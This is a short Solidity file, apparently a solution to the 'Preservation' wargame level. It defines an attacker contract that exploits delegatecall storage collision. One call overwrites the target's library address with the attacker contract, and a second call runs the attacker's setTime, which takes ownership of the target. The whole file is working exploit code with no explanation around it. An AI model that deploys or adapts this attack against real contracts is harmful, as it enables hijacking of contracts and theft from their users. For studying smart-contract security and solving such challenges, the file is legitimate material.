// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target/Preservation.sol";

contract PreservationAttacker {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    Preservation preservation;

    constructor(Preservation _preservation) {
        preservation = Preservation(_preservation);
    }

    function attack() public {
        preservation.setFirstTime(uint(uint160(address(this))));
        preservation.setFirstTime(1);
    }

    function setTime(uint _time) public {
        owner = tx.origin;
    }
}
